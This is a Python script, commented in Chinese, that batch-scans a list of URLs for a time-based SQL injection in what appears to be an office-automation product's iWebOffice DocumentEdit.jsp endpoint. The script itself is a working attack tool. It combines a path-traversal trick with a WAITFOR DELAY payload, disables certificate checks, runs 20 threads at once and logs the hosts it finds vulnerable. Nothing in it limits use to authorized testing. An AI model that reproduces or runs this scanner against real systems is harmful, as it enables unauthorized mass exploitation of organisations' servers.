import requests
import time
import urllib.parse
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning

# 禁用SSL警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# 全局变量
TIMEOUT = 10
DELAY_THRESHOLD = 4.5  # 响应时间阈值（秒）
THREADS = 20  # 并发线程数
REDIRECT_TARGET = "/defaultroot/login.jsp?errorType=overtime"

def normalize_url(url):
    """规范化URL：添加协议前缀并移除末尾斜杠"""
    url = url.strip()
    if not url:
        return None
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    # 移除末尾斜杠
    if url.endswith('/'):
        url = url[:-1]
    
    return url

def test_injection(url):
    """测试URL是否存在时间注入漏洞，仅对状态码200/500的响应进行判断"""
    # 构造注入路径
    injection_path = "/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:5'--"
    
    target_url = urllib.parse.urljoin(url, injection_path)
    
    try:
        start_time = time.time()
        
        # 发送请求，设置超时时间，并忽略SSL证书验证，允许重定向
        response = requests.get(target_url, timeout=TIMEOUT, verify=False, allow_redirects=True)
        
        end_time = time.time()
        response_time = end_time - start_time
        
        # 检查是否重定向到特定登录页面
        if REDIRECT_TARGET in response.url:
            return False, target_url, response_time, response.status_code, "重定向到登录页面"
        
        # 只对状态码为200或500的响应进行注入判断
        if response.status_code == 200 or response.status_code == 500:
            # 如果响应时间超过阈值，认为存在注入漏洞
            if response_time >= DELAY_THRESHOLD:
                return True, target_url, response_time, response.status_code, None
            else:
                return False, target_url, response_time, response.status_code, None
        else:
            # 状态码不是200或500，不进行注入判断
            return False, target_url, response_time, response.status_code, f"状态码: {response.status_code}"
            
    except requests.exceptions.Timeout:
        return True, target_url, None, None, "请求超时"
    except requests.exceptions.RequestException as e:
        return False, target_url, None, None, f"请求错误: {str(e)}"
    except Exception as e:
        return False, target_url, None, None, f"未知错误: {str(e)}"

def process_url(url):
    """处理单个URL的包装函数"""
    normalized_url = normalize_url(url)
    if not normalized_url:
        return None, None, None, None, None, "URL格式无效"
    
    is_vulnerable, tested_url, response_time, status_code, error = test_injection(normalized_url)
    return is_vulnerable, tested_url, response_time, status_code, error, normalized_url

def main():
    # 读取URL文件
    try:
        with open('url.txt', 'r') as file:
            urls = file.readlines()
    except FileNotFoundError:
        print("错误: 未找到url.txt文件")
        return
    except Exception as e:
        print(f"读取文件时出错: {e}")
        return
    
    # 存储存在注入的URL
    vulnerable_urls = []
    total_urls = len(urls)
    processed = 0
    
    print(f"开始检测 {total_urls} 个URL...")
    print("注意: 仅对状态码为200/500的响应进行注入判断")
    print(f"注意: 如果重定向到 {REDIRECT_TARGET} 则认为没有漏洞")
    start_time = time.time()
    
    # 使用线程池并发处理URL
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        # 提交所有任务
        future_to_url = {executor.submit(process_url, url): url for url in urls}
        
        # 处理完成的任务
        for future in concurrent.futures.as_completed(future_to_url):
            url = future_to_url[future]
            processed += 1
            
            try:
                is_vulnerable, tested_url, response_time, status_code, error, normalized_url = future.result()
                
                if error:
                    if "重定向到登录页面" in error:
                        status_msg = f"安全 (重定向到登录页面)"
                    else:
                        status_msg = f"错误: {error}"
                elif status_code != 200 and status_code != 500:
                    status_msg = f"跳过 (状态码: {status_code})"
                elif is_vulnerable:
                    status_msg = f"存在漏洞 (响应时间: {response_time:.2f}s)"
                    result = f"存在注入漏洞 - URL: {tested_url} - 响应时间: {response_time:.2f}秒 - 状态码: {status_code}"
                    vulnerable_urls.append(result)
                else:
                    status_msg = f"安全 (响应时间: {response_time:.2f}s)"
                
                print(f"[{processed}/{total_urls}] {normalized_url} - {status_msg}")
                    
            except Exception as e:
                print(f"[{processed}/{total_urls}] {url} - 处理异常: {e}")
    
    total_time = time.time() - start_time
    print(f"\n检测完成! 总共耗时: {total_time:.2f}秒")
    
    # 将结果写入文件
    if vulnerable_urls:
        with open('result.txt', 'w') as result_file:
            for result in vulnerable_urls:
                result_file.write(result + '\n')
        print(f"发现 {len(vulnerable_urls)} 个存在漏洞的URL，结果已保存到 result.txt")
    else:
        print("未发现存在漏洞的URL")

if __name__ == "__main__":
    main()